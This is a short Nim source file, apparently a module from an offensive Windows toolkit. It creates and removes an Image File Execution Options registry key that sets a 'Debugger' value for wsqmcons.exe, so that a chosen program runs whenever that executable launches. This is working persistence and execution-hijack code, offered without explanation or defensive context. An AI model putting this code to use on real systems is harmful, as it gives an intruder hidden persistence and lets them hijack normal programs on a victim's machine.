import winim
import winexception

const IFEO_KEY = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"

proc createIFEOKey*(exe_name = "wsqmcons.exe", debugger: string): bool =
  let lpSubkey = IFEO_KEY & exe_name
  var handle: HKEY
  var status = RegCreateKeyExA(
    HKEY_LOCAL_MACHINE, 
    lpSubkey,
    0,
    NULL,
    REG_OPTION_BACKUP_RESTORE,
    KEY_SET_VALUE,
    NULL,
    &handle,
    NULL
  )
  if status != ERROR_SUCCESS:
    raiseException("Unable to obtain key handle.")
    return false
  else:
    echo "Registry key handle obtained. Subkey: " & lpSubkey

  var data = debugger.mstring

  status = RegSetValueExA(
    handle, 
    "Debugger", 
    0, 
    REG_SZ, 
    cast[PBYTE](&data), 
    (debugger.len + 1).DWORD
  )
  
  if status != ERROR_SUCCESS:
    raiseException("Unable to set the key value.")
    return false
  else:
    echo "Registry key set."


proc deleteIFEOKey*(exe_name = "wsqmcons.exe"): bool =
  let regval = ("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" & exe_name).LPCSTR
  return RegDeleteKeyA(HKEY_LOCAL_MACHINE, regval) == ERROR_SUCCESS
